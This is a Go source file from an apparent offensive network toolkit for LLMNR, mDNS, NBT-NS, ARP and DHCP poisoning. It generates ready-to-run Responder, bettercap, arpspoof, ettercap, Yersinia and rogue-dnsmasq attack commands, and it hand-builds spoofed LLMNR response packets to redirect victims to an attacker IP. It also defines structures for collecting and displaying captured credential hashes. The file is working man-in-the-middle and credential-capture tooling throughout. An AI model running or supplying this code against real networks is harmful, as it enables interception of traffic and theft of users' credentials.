package poison

import (
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

// PoisonType represents the type of network poisoning
type PoisonType string

const (
	LLMNR  PoisonType = "llmnr"
	MDNS   PoisonType = "mdns"
	NBT_NS PoisonType = "nbt-ns"
	ARP    PoisonType = "arp"
	DHCP   PoisonType = "dhcp"
)

// PoisonOptions holds poisoning configuration
type PoisonOptions struct {
	Type      PoisonType
	Interface string
	TargetIP  string
	SpoofIP   string
	Duration  int
	Analyze   bool
}

// CapturedHash represents a captured credential/hash
type CapturedHash struct {
	Protocol  string
	Username  string
	Domain    string
	Hash      string
	SourceIP  string
	Timestamp time.Time
}

// PoisonSession represents an active poisoning session
type PoisonSession struct {
	Type      PoisonType
	Interface string
	StartTime time.Time
	Packets   int
	Hashes    []CapturedHash
	Running   bool
	mu        sync.Mutex
}

// ProtocolInfo describes a poisoning protocol
type ProtocolInfo struct {
	Name        string
	Port        int
	Description string
	Detectable  bool
}

// Protocols lists available poisoning protocols
var Protocols = map[PoisonType]ProtocolInfo{
	LLMNR: {
		Name:        "LLMNR",
		Port:        5355,
		Description: "Link-Local Multicast Name Resolution (UDP)",
		Detectable:  true,
	},
	MDNS: {
		Name:        "mDNS",
		Port:        5353,
		Description: "Multicast DNS (UDP)",
		Detectable:  true,
	},
	NBT_NS: {
		Name:        "NBT-NS",
		Port:        137,
		Description: "NetBIOS Name Service (UDP)",
		Detectable:  true,
	},
	ARP: {
		Name:        "ARP",
		Port:        0,
		Description: "Address Resolution Protocol (Layer 2)",
		Detectable:  false,
	},
}

// AnalyzeNetwork analyzes network for poisoning opportunities
func AnalyzeNetwork(iface string, duration int) []string {
	var findings []string

	// Check for LLMNR traffic
	llmnrFound := listenForTraffic("udp", ":5355", duration/3)
	if llmnrFound {
		findings = append(findings, "[+] LLMNR traffic detected - vulnerable to poisoning")
	}

	// Check for mDNS traffic
	mdnsFound := listenForTraffic("udp", ":5353", duration/3)
	if mdnsFound {
		findings = append(findings, "[+] mDNS traffic detected - vulnerable to poisoning")
	}

	// Check for NBT-NS traffic
	nbtFound := listenForTraffic("udp", ":137", duration/3)
	if nbtFound {
		findings = append(findings, "[+] NBT-NS traffic detected - vulnerable to poisoning")
	}

	if len(findings) == 0 {
		findings = append(findings, "[-] No poisonable traffic detected during analysis period")
	}

	return findings
}

// listenForTraffic listens for traffic on a port
func listenForTraffic(network, address string, timeoutSec int) bool {
	conn, err := net.ListenPacket(network, address)
	if err != nil {
		return false
	}
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(time.Duration(timeoutSec) * time.Second))

	buf := make([]byte, 1024)
	_, _, err = conn.ReadFrom(buf)
	return err == nil
}

// GenerateResponderCommand generates Responder command
func GenerateResponderCommand(iface string, options map[string]bool) string {
	cmd := fmt.Sprintf("responder -I %s", iface)

	if options["analyze"] {
		cmd += " -A"
	}
	if options["wpad"] {
		cmd += " -w"
	}
	if options["fingerprint"] {
		cmd += " -f"
	}
	if !options["smb"] {
		cmd += " --disable-ess"
	}

	return cmd
}

// GenerateBettercapCommand generates Bettercap command
func GenerateBettercapCommand(iface string, modules []string) string {
	cmd := fmt.Sprintf("bettercap -iface %s", iface)

	if len(modules) > 0 {
		cmd += fmt.Sprintf(" -eval '%s'",
			strings.Join(modules, "; "))
	}

	return cmd
}

// GetARPPoisonCommand generates ARP poisoning commands
func GetARPPoisonCommand(targetIP, gatewayIP, iface string) []string {
	return []string{
		"# Enable IP forwarding",
		"echo 1 > /proc/sys/net/ipv4/ip_forward",
		"",
		"# ARP poisoning with arpspoof",
		fmt.Sprintf("arpspoof -i %s -t %s %s", iface, targetIP, gatewayIP),
		fmt.Sprintf("arpspoof -i %s -t %s %s", iface, gatewayIP, targetIP),
		"",
		"# Or with ettercap",
		fmt.Sprintf("ettercap -T -q -i %s -M arp:remote /%s// /%s//", iface, targetIP, gatewayIP),
		"",
		"# Or with bettercap",
		fmt.Sprintf("bettercap -iface %s -eval 'set arp.spoof.targets %s; arp.spoof on'", iface, targetIP),
	}
}

// GetDHCPPoisonInfo returns DHCP poisoning information
func GetDHCPPoisonInfo() []string {
	return []string{
		"# DHCP Poisoning/Starvation",
		"",
		"# Using Yersinia",
		"yersinia dhcp -attack 1  # DHCP starvation",
		"yersinia dhcp -attack 2  # Rogue DHCP server",
		"",
		"# Using dhcpig (DHCP exhaustion)",
		"dhcpig eth0",
		"",
		"# Rogue DHCP with dnsmasq",
		"dnsmasq --interface=eth0 --dhcp-range=192.168.1.100,192.168.1.200 --dhcp-option=6,<evil-dns>",
	}
}

// BuildLLMNRResponse builds an LLMNR response packet
func BuildLLMNRResponse(transactionID []byte, queryName string, spoofIP string) []byte {
	// LLMNR Response structure
	packet := make([]byte, 0)

	// Transaction ID (2 bytes)
	packet = append(packet, transactionID...)

	// Flags: Response, Authoritative
	packet = append(packet, 0x80, 0x00)

	// Questions: 1
	packet = append(packet, 0x00, 0x01)

	// Answer RRs: 1
	packet = append(packet, 0x00, 0x01)

	// Authority RRs: 0
	packet = append(packet, 0x00, 0x00)

	// Additional RRs: 0
	packet = append(packet, 0x00, 0x00)

	// Query name
	nameParts := strings.Split(queryName, ".")
	for _, part := range nameParts {
		packet = append(packet, byte(len(part)))
		packet = append(packet, []byte(part)...)
	}
	packet = append(packet, 0x00)

	// Type: A
	packet = append(packet, 0x00, 0x01)

	// Class: IN
	packet = append(packet, 0x00, 0x01)

	// Answer section (pointer to query name)
	packet = append(packet, 0xc0, 0x0c)

	// Type: A
	packet = append(packet, 0x00, 0x01)

	// Class: IN
	packet = append(packet, 0x00, 0x01)

	// TTL: 30 seconds
	packet = append(packet, 0x00, 0x00, 0x00, 0x1e)

	// Data length: 4 (IPv4)
	packet = append(packet, 0x00, 0x04)

	// IP address
	ip := net.ParseIP(spoofIP).To4()
	packet = append(packet, ip...)

	return packet
}

// DisplayProtocols displays available poisoning protocols
func DisplayProtocols() {
	fmt.Println("\n[NETWORK POISONING PROTOCOLS]")
	fmt.Println(strings.Repeat("=", 60))

	for pType, info := range Protocols {
		detectStr := "Yes"
		if !info.Detectable {
			detectStr = "No"
		}

		fmt.Printf("\n%s (%s)\n", info.Name, pType)
		fmt.Printf("  Port:       %d\n", info.Port)
		fmt.Printf("  Detectable: %s\n", detectStr)
		fmt.Printf("  %s\n", info.Description)
	}

	fmt.Println()
}

// DisplayAnalysis displays network analysis results
func DisplayAnalysis(findings []string) {
	fmt.Println("\n[NETWORK ANALYSIS]")
	fmt.Println(strings.Repeat("=", 60))

	for _, finding := range findings {
		fmt.Println(finding)
	}

	fmt.Println()
}

// DisplayCommands displays poisoning commands
func DisplayCommands(poisonType PoisonType, iface string) {
	fmt.Printf("\n[%s POISONING COMMANDS]\n", strings.ToUpper(string(poisonType)))
	fmt.Println(strings.Repeat("=", 60))

	switch poisonType {
	case LLMNR, MDNS, NBT_NS:
		fmt.Println("\n# Using Responder (recommended)")
		fmt.Println(GenerateResponderCommand(iface, map[string]bool{
			"analyze": false,
			"wpad":    true,
			"smb":     true,
		}))

		fmt.Println("\n# Using Bettercap")
		modules := []string{
			"net.probe on",
			"net.sniff on",
		}
		if poisonType == LLMNR {
			modules = append(modules, "net.recon on")
		}
		fmt.Println(GenerateBettercapCommand(iface, modules))

	case ARP:
		for _, line := range GetARPPoisonCommand("<target>", "<gateway>", iface) {
			fmt.Println(line)
		}

	case DHCP:
		for _, line := range GetDHCPPoisonInfo() {
			fmt.Println(line)
		}
	}

	fmt.Println()
}

// DisplayCapturedHashes displays captured hashes
func DisplayCapturedHashes(hashes []CapturedHash) {
	fmt.Println("\n[CAPTURED HASHES]")
	fmt.Println(strings.Repeat("=", 60))

	if len(hashes) == 0 {
		fmt.Println("No hashes captured")
		return
	}

	for _, h := range hashes {
		fmt.Printf("\n[%s] %s\\%s\n", h.Protocol, h.Domain, h.Username)
		fmt.Printf("  Source: %s\n", h.SourceIP)
		fmt.Printf("  Time:   %s\n", h.Timestamp.Format(time.RFC3339))
		fmt.Printf("  Hash:   %s\n", h.Hash)
	}

	fmt.Println()
}
